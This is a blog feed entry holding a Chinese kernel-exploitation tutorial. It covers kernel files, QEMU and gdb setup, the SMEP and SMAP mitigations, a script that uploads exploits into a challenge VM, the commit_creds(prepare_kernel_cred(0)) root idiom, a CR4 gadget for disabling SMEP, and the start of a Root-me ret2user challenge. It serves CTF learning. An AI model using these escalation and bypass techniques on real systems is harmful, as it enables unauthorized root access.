<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>hhdx&#39;s blog</title>
  
  
  <link href="http://hhdx.xyz/atom.xml" rel="self"/>
  
  <link href="http://hhdx.xyz/"/>
  <updated>2020-10-25T11:42:55.350Z</updated>
  <id>http://hhdx.xyz/</id>
  
  <author>
    <name>hhdx</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Kernel Pwn: 从入门到入土</title>
    <link href="http://hhdx.xyz/2020/10/25/Kernel-Pwn-%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/"/>
    <id>http://hhdx.xyz/2020/10/25/Kernel-Pwn-%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/</id>
    <published>2020-10-25T11:12:40.000Z</published>
    <updated>2020-10-25T11:42:55.350Z</updated>
    
    <content type="html"><![CDATA[<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="内核文件区别"><a href="#内核文件区别" class="headerlink" title="内核文件区别"></a>内核文件区别</h3><p><code>vmlinux</code> 是静态链接的可执行文件，未压缩的内核，最原始的文件，可以用来调试。</p><p><code>vmlinuz</code> 是可引导的、压缩的内核。没有调试信息等数据，不可用于调试。启动时会自解压，通常会显示以下信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Decompressing Linux... done</span><br><span class="line">Booting the kernel.</span><br></pre></td></tr></table></figure><p><code>zImage</code> 是经过压缩的小内核（小于512KB）。</p><p><code>bzImage</code> 是经过压缩的大内核（大于512KB）。</p><h3 id="Initial-Ramdisk"><a href="#Initial-Ramdisk" class="headerlink" title="Initial Ramdisk"></a>Initial Ramdisk</h3><p>名字类似<code>initramfs.cpio</code> 文件，一般可以使用cpio读取其中的文件。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> find . | cpio -o --format=newc &gt; initramfs.cpio <span class="comment"># compress</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo cpio -idmv &lt; initramfs.cpio <span class="comment"># depress</span></span></span><br></pre></td></tr></table></figure><p>有时也经过了gzip的压缩。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> mv initramfs.cpio initramfs.cpio.gz</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> gunzip initramfs.cpio.gz<span class="comment"># 解压得到initramfs.cpio</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> cpio -idmv &lt; initramfs.cpio</span></span><br></pre></td></tr></table></figure><p>更改为正确的后缀之后，图形界面“归档管理器”也可以打开。</p><a id="more"></a><h2 id="Compile-kernel"><a href="#Compile-kernel" class="headerlink" title="Compile kernel"></a>Compile kernel</h2><p>Host: Ubuntu 20.04</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> wget https://cdn.kernel.org/pub/linux/kernel/v5.x/linux-5.4.72.tar.xz <span class="comment"># get link from kernel.org</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> xz -d -v linux-5.4.72.tar.xz</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tar xvf linux-5.4.72.tar</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> linux-5.4.72</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> cp -v /boot/config-$(uname -r) .config</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install build-essential libncurses-dev bison flex libssl-dev libelf-dev</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> make menuconfig <span class="comment"># optional, 此项设置好之后除非必要，尽量不要改动，否则会完全的重新编译</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> make <span class="comment"># make -j $(nproc)</span></span></span><br></pre></td></tr></table></figure><h2 id="Qemu"><a href="#Qemu" class="headerlink" title="Qemu"></a>Qemu</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">-m 指定内存大小</span><br><span class="line">-nographic 没有图形界面，同时影响串并口</span><br><span class="line">-kernel 指定启动内核</span><br><span class="line">-machine 选择模拟的机器 -machine help显示所有</span><br><span class="line">    -accel 选择加速，有kvm、xen等等</span><br><span class="line">-append 添加内核启动选项</span><br><span class="line">-monitor 重定向monitor到主机设备，图形模式默认到vc，非图形模式默认到stdio</span><br><span class="line">-fsdev 定义一个新的文件系统设备</span><br><span class="line">    与-device virtio-9t-同用</span><br><span class="line">    -device virtio-9p-type,fsdev&#x3D;id,mount_tag&#x3D;mount_tag</span><br><span class="line">-enable-kvm 启用kvm全虚拟化支持</span><br><span class="line">-initrd 将文件用作起始ram disk</span><br><span class="line">-hda&#x2F;b&#x2F;c&#x2F;d 将文件用作硬盘0&#x2F;1&#x2F;2&#x2F;3</span><br><span class="line">-snapshot 写入临时文件，而不是映像文件。（可以强制写回</span><br></pre></td></tr></table></figure><h2 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h2><p>使用qemu的<code>-s</code>选项，默认将会在1234端口开启gdb server。如果 1234 号端口用不了，也可以换成 -gdb tcp::[port num]</p><p>加断点的话，CTRL+C打断 gdb，输入就行。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> lsmod <span class="comment"># 查看加载的模块</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> cat /sys/module/basic1_ch1/sections/.text <span class="comment"># 依次获取.text .bss .data加载地址</span></span></span><br><span class="line"><span class="meta">(gdb)$</span><span class="bash"> target remote :1234 <span class="comment"># 连接到本地调试端口</span></span></span><br><span class="line"><span class="meta">(gdb)$</span><span class="bash"> add-symbol-file ./tostring.ko 0xc3827000 -s .bss 0xc3827600 -s .data 0xc3827360 <span class="comment"># 在gdb中加载符号</span></span></span><br></pre></td></tr></table></figure><h2 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h2><h3 id="SMEP"><a href="#SMEP" class="headerlink" title="SMEP"></a>SMEP</h3><p>全称Supervisor Mode Execution Protection，当处理器处于 ring 0 模式，执行用户空间的代码会触发页错误。（在 arm 中该保护称为 PXN)。</p><p>系统根据 CR4 寄存器的值判断是否开启 smep 保护，当 CR4 寄存器的第 20 位是 1 时，保护开启；是 0 时，保护关闭。</p><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/imgCR4.jpg" alt="CR4"></p><p>CR4 寄存器是可以通过 mov 指令修改的。从vmlinux中提取gadget，可以达到这个目的。</p><p>gdb无法查看CR4寄存器的值，可以通过kernel crash时的信息来查看。关闭SMEP保护，常用一个固定的值0x6f0,即<code>mov cr4, 0x6f0</code>。</p><h3 id="SMAP"><a href="#SMAP" class="headerlink" title="SMAP"></a>SMAP</h3><p>Superivisor Mode Access Protection，类似于 SMEP，当处理器处于 ring 0 模式，访问用户空间的数据会触发页错误。</p><h3 id="MMAP-MIN-ADDR"><a href="#MMAP-MIN-ADDR" class="headerlink" title="MMAP_MIN_ADDR"></a>MMAP_MIN_ADDR</h3><ul><li>MMAP_MIN_ADDR：控制着mmap能够映射的最低内存地址，防止用户非法分配并访问低地址数据。</li></ul><h2 id="upload脚本"><a href="#upload脚本" class="headerlink" title="upload脚本"></a>upload脚本</h2><p>用于将poc或exp上传到主机。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">prompt = <span class="string">&quot;$ &quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span>(<span class="params">name</span>):</span></span><br><span class="line">    io.sendlineafter(prompt, <span class="string">&quot;stty -echo&quot;</span>)    <span class="comment"># 关闭回显</span></span><br><span class="line">    os.system(<span class="string">&quot;gcc -static -m32 -O2 ./&#123;&#125;.c -o &#123;&#125;&quot;</span>.format(name, name)) <span class="comment"># 普通gcc编译。musl-gcc编译32bit出错</span></span><br><span class="line">    os.system(<span class="string">&quot;gzip -c &#123;&#125; &gt; &#123;&#125;.gz&quot;</span>.format(name, name))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">&quot;&#123;&#125;.gz&quot;</span>.format(name), <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.read()</span><br><span class="line">    </span><br><span class="line">    print(<span class="string">&quot;len: %d&quot;</span> % len(content))</span><br><span class="line">    encoded = base64.b64encode(content)</span><br><span class="line">    print(<span class="string">&quot;len: %d&quot;</span> % len(encoded))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(encoded), <span class="number">1000</span>):    <span class="comment"># 文件过大会出现上传不完整，后来改成1000就可以</span></span><br><span class="line">        io.sendline(<span class="string">&quot;echo \&quot;&#123;&#125;\&quot; &gt;&gt; &#123;&#125;.gz.b64&quot;</span>.format(encoded[i:i+<span class="number">1000</span>].decode(<span class="string">&quot;ascii&quot;</span>), name) )</span><br><span class="line">    </span><br><span class="line">    io.sendlineafter(prompt, <span class="string">&quot;base64 -d &#123;&#125;.gz.b64 &gt; &#123;&#125;.gz&quot;</span>.format(name, name))</span><br><span class="line">    io.sendlineafter(prompt, <span class="string">&quot;gunzip &#123;&#125;.gz&quot;</span>.format(name))</span><br><span class="line">    io.sendlineafter(prompt, <span class="string">&quot;chmod +x &#123;&#125;&quot;</span>.format(name))</span><br><span class="line">    io.sendlineafter(prompt, <span class="string">&quot;./&#123;&#125;&quot;</span>.format(name))</span><br><span class="line">    io.interactive()</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./._start_vm&quot;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">upload(<span class="string">&quot;poc&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># session = ssh(USER, HOST, PORT, PW) # ssh连接的情况</span></span><br><span class="line"><span class="comment"># io = session.run(&quot;/bin/sh&quot;)</span></span><br></pre></td></tr></table></figure><h2 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h2><h3 id="Loadable-Kernel-Modules-LKMs-3"><a href="#Loadable-Kernel-Modules-LKMs-3" class="headerlink" title="Loadable Kernel Modules(LKMs)[3]"></a>Loadable Kernel Modules(LKMs)[3]</h3><p>可加载核心模块 (或直接称为内核模块) 就像运行在内核空间的可执行程序，包括:</p><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/imgLKM.jpg" alt="LKM"></p><p>LKMs 的文件格式和用户态的可执行程序相同，Linux 下为 ELF，Windows 下为 exe/dll，mac 下为 MACH-O，因此我们可以用 IDA 等工具来分析内核模块。</p><p>模块可以被单独编译，但不能单独运行。它在运行时被链接到内核作为内核的一部分在内核空间运行，这与运行在用户控件的进程不同。</p><p>模块通常用来实现一种文件系统、一个驱动程序或者其他内核上层的功能。</p><blockquote><p>Linux 内核之所以提供模块机制，是因为它本身是一个单内核 (monolithic kernel)。单内核的优点是效率高，因为所有的内容都集合在一起，但缺点是可扩展性和可维护性相对较差，模块机制就是为了弥补这一缺陷。</p></blockquote><h4 id="相关指令"><a href="#相关指令" class="headerlink" title="相关指令"></a>相关指令</h4><ol><li><strong>insmod</strong>: 将指定模块加载到内核中。</li><li><strong>rmmod</strong>: 从内核中卸载指定模块。</li><li><strong>lsmod</strong>: 列出已经加载的模块。</li><li><strong>modprobe</strong>: 添加或删除模块，modprobe 在加载模块时会查找依赖关系。</li></ol><h4 id="file-operations结构体"><a href="#file-operations结构体" class="headerlink" title="file_operations结构体"></a>file_operations结构体</h4><p>用户进程在对设备文件进行诸如read/write操作的时候，<strong>系统调用通过设备文件的主设备号找到相应的设备驱动程序，然后读取这个数据结构相应的函数指针，接着把控制权交给该函数，这是Linux的设备驱动程序工作的基本原理。</strong></p><p>内核模块程序的结构中包括一些call back回调表，对应的函数存储在一个file_operations(fop)结构体中，这也是相当重要的结构体，结构体中实现了的回调函数就会静态初始化函数地址，而未实现的函数，值为NULL。例如：</p><table><thead><tr><th align="center">Events</th><th align="center">User functions</th><th align="center">Kernel functions</th></tr></thead><tbody><tr><td align="center">load</td><td align="center">insmod</td><td align="center">module_init()</td></tr><tr><td align="center">open</td><td align="center">fopen</td><td align="center">file_operations: open</td></tr><tr><td align="center">read</td><td align="center">fread</td><td align="center">file_operations: read</td></tr><tr><td align="center">write</td><td align="center">fwrite</td><td align="center">file_operations: write</td></tr><tr><td align="center">close</td><td align="center">fclose</td><td align="center">file_operations: release</td></tr><tr><td align="center">remove</td><td align="center">rmmod</td><td align="center">module_exit()</td></tr></tbody></table><h3 id="状态切换-3"><a href="#状态切换-3" class="headerlink" title="状态切换[3]"></a>状态切换[3]</h3><h4 id="user-space-to-kernel-space"><a href="#user-space-to-kernel-space" class="headerlink" title="user space to kernel space"></a>user space to kernel space</h4><p>当发生 <code>系统调用</code>，<code>产生异常</code>，<code>外设产生中断</code>等事件时，会发生用户态到内核态的切换，具体的过程为：</p><ol><li>通过 <code>swapgs</code> 切换 GS 段寄存器，将 GS 寄存器值和一个特定位置的值进行交换，目的是保存 GS 值，同时将该位置的值作为内核执行时的 GS 值使用。</li><li>将当前栈顶（用户空间栈顶）记录在 CPU 独占变量区域里，将 CPU 独占区域里记录的内核栈顶放入 rsp/esp。</li><li>通过 push 保存各寄存器值，具体的 <a href="http://elixir.free-electrons.com/linux/v4.12/source/arch/x86/entry/entry_64.S">代码</a> 如下:</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">ENTRY(entry_SYSCALL_64)</span><br><span class="line"> &#x2F;* SWAPGS_UNSAFE_STACK是一个宏，x86直接定义为swapgs指令 *&#x2F;</span><br><span class="line"> SWAPGS_UNSAFE_STACK</span><br><span class="line">   </span><br><span class="line"> &#x2F;* 保存栈值，并设置内核栈 *&#x2F;</span><br><span class="line"> movq %rsp, PER_CPU_VAR(rsp_scratch)</span><br><span class="line"> movq PER_CPU_VAR(cpu_current_top_of_stack), %rsp</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">&#x2F;* 通过push保存寄存器值，形成一个pt_regs结构 *&#x2F;</span><br><span class="line">&#x2F;* Construct struct pt_regs on stack *&#x2F;</span><br><span class="line">pushq  $__USER_DS      &#x2F;* pt_regs-&gt;ss *&#x2F;</span><br><span class="line">pushq  PER_CPU_VAR(rsp_scratch)  &#x2F;* pt_regs-&gt;sp *&#x2F;</span><br><span class="line">pushq  %r11             &#x2F;* pt_regs-&gt;flags *&#x2F;</span><br><span class="line">pushq  $__USER_CS      &#x2F;* pt_regs-&gt;cs *&#x2F;</span><br><span class="line">pushq  %rcx             &#x2F;* pt_regs-&gt;ip *&#x2F;</span><br><span class="line">pushq  %rax             &#x2F;* pt_regs-&gt;orig_ax *&#x2F;</span><br><span class="line">pushq  %rdi             &#x2F;* pt_regs-&gt;di *&#x2F;</span><br><span class="line">pushq  %rsi             &#x2F;* pt_regs-&gt;si *&#x2F;</span><br><span class="line">pushq  %rdx             &#x2F;* pt_regs-&gt;dx *&#x2F;</span><br><span class="line">pushq  %rcx tuichu    &#x2F;* pt_regs-&gt;cx *&#x2F;</span><br><span class="line">pushq  $-ENOSYS        &#x2F;* pt_regs-&gt;ax *&#x2F;</span><br><span class="line">pushq  %r8              &#x2F;* pt_regs-&gt;r8 *&#x2F;</span><br><span class="line">pushq  %r9              &#x2F;* pt_regs-&gt;r9 *&#x2F;</span><br><span class="line">pushq  %r10             &#x2F;* pt_regs-&gt;r10 *&#x2F;</span><br><span class="line">pushq  %r11             &#x2F;* pt_regs-&gt;r11 *&#x2F;</span><br><span class="line">sub $(6*8), %rsp      &#x2F;* pt_regs-&gt;bp, bx, r12-15 not saved *&#x2F;</span><br></pre></td></tr></table></figure><ol start="4"><li><p>通过汇编指令判断是否为 x32_abi。</p></li><li><p>通过系统调用号，跳到全局变量 <code>sys_call_table</code> 相应位置继续执行系统调用。</p></li></ol><h4 id="kernel-space-to-user-space"><a href="#kernel-space-to-user-space" class="headerlink" title="kernel space to user space"></a>kernel space to user space</h4><ol><li>通过 <code>swapgs</code> 恢复 GS 值</li><li>通过 <code>sysretq</code> 或者 <code>iretq</code> 恢复到用户控件继续执行。如果使用 <code>iretq</code> 还需要给出用户空间的一些信息（CS, eflags/rflags, esp/rsp 等）</li></ol><blockquote><p>iretq中q后缀，是quadra word的意思，也就是说64位指令。还存在iretd, iretw等。</p></blockquote><h3 id="内核态函数-3"><a href="#内核态函数-3" class="headerlink" title="内核态函数[3]"></a>内核态函数[3]</h3><p>相比用户态库函数，内核态的函数有了一些变化</p><ul><li>printf() -&gt; printk()，但需要注意的是 printk() 不一定会把内容显示到终端上，但一定在内核缓冲区里，可以通过 <code>dmesg</code> 查看效果</li><li>memcpy() -&gt; copy_from_user()/copy_to_user()<br>  copy_from_user() 实现了将用户空间的数据传送到内核空间<br>  copy_to_user() 实现了将内核空间的数据传送到用户空间</li><li>malloc() -&gt; kmalloc()，内核态的内存分配函数，和 malloc() 相似，但使用的是 <code>slab/slub 分配器</code></li><li>free() -&gt; kfree()，同 kmalloc()</li></ul><p><strong>提权函数</strong></p><p>kernel 管理进程，因此 kernel 也记录了进程的权限。kernel 中有两个可以方便的改变权限的函数：</p><ul><li><code>int commit_creds(struct cred *new)</code></li><li><code>struct cred* prepare_kernel_cred(struct task_struct* daemon)</code></li></ul><p>从函数名也可以看出，执行 <code>commit_creds(prepare_kernel_cred(0))</code> 即可获得 root 权限（root 的 uid，gid 均为 0）</p><p>执行 <code>commit_creds(prepare_kernel_cred(0))</code> 也是最常用的提权手段，两个函数的地址都可以在 <code>/proc/kallsyms</code> 中查看（较老的内核版本中是 <code>/proc/ksyms</code>。通常需要root权限查看。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo grep commit_creds /proc/kallsyms</span></span><br></pre></td></tr></table></figure><p><code>struct cred</code> 每个进程都有这么个结构，如果能修改，也就获得了对应权限。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line"><span class="keyword">atomic_t</span>usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line"><span class="keyword">atomic_t</span>subscribers;<span class="comment">/* number of processes subscribed */</span></span><br><span class="line"><span class="keyword">void</span>*put_addr;</span><br><span class="line"><span class="keyword">unsigned</span>magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">kuid_t</span>uid;<span class="comment">/* real UID of the task */</span></span><br><span class="line"><span class="keyword">kgid_t</span>gid;<span class="comment">/* real GID of the task */</span></span><br><span class="line"><span class="keyword">kuid_t</span>suid;<span class="comment">/* saved UID of the task */</span></span><br><span class="line"><span class="keyword">kgid_t</span>sgid;<span class="comment">/* saved GID of the task */</span></span><br><span class="line"><span class="keyword">kuid_t</span>euid;<span class="comment">/* effective UID of the task */</span></span><br><span class="line"><span class="keyword">kgid_t</span>egid;<span class="comment">/* effective GID of the task */</span></span><br><span class="line"><span class="keyword">kuid_t</span>fsuid;<span class="comment">/* UID for VFS ops */</span></span><br><span class="line"><span class="keyword">kgid_t</span>fsgid;<span class="comment">/* GID for VFS ops */</span></span><br><span class="line"><span class="keyword">unsigned</span>securebits;<span class="comment">/* SUID-less security management */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_permitted;<span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_effective;<span class="comment">/* caps we can actually use */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_bset;<span class="comment">/* capability bounding set */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_ambient;<span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>jit_keyring;<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment"> * keys to */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line"><span class="keyword">void</span>*security;<span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span><span class="comment">/* real user ID subscription */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span><span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span><span class="title">rcu</span>;</span><span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="ret2user-Rootme-buffer-overflow-basic-1"><a href="#ret2user-Rootme-buffer-overflow-basic-1" class="headerlink" title="ret2user | Rootme buffer overflow basic 1"></a>ret2user | <a href="https://www.root-me.org/en/Challenges/App-System/LinKern-x86-Buffer-overflow-basic-1">Rootme buffer overflow basic 1</a></h3><p>题目有以下几个文件：</p><ul><li>bzImage：内核文件</li><li>ch1.c：模块源代码</li><li>initramfs.img：用cpio打包成的初始文件系统</li><li>passwd.img：flag所在，在qemu中普通用户无法读取</li><li>run：set-uid程序，运行._start_vm启动qemu</li><li>._start_vm：启动脚本</li></ul><p>虚拟机中<code>/init</code>文件，在Linux启动的最后一步将会执行此脚本。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 挂载 devtmpfs 类型的文件系统，设备名设置为 none，挂载目录为 /dev</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> devtmpfs 的功用是在 Linux 核心启动早期建立一个初步的 /dev，</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 令一般启动程序不用等待 udev，缩短 GNU/Linux 的开机时间。[4]</span></span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> flag</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line">mkdir -p /passwd</span><br><span class="line">mount -t ext2 -o ro /dev/sda /passwd</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> share</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 挂载与主机共享的文件夹</span></span><br><span class="line">mkdir -p /mnt/share</span><br><span class="line">mount -t 9p -o trans=virtio rootme /mnt/share/ -oversion=9p2000.L,posixacl,sync</span><br><span class="line">chmod 777 /mnt/share/</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> module</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 安装漏洞模块</span></span><br><span class="line">insmod /lib/modules/*/rootme/*.ko</span><br><span class="line">chmod 666 /dev/tostring </span><br><span class="line"><span class="meta">#</span><span class="bash"> mmap_min_addr to 0 <span class="keyword">for</span> the challenge to be simpler <span class="keyword">for</span> now ;)</span></span><br><span class="line">echo 0 &gt; /proc/sys/vm/mmap_min_addr</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> shell</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line">cat /etc/issue</span><br><span class="line">export ENV=/etc/profile</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"> </span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">umount /dev</span><br><span class="line"> </span><br><span class="line">poweroff 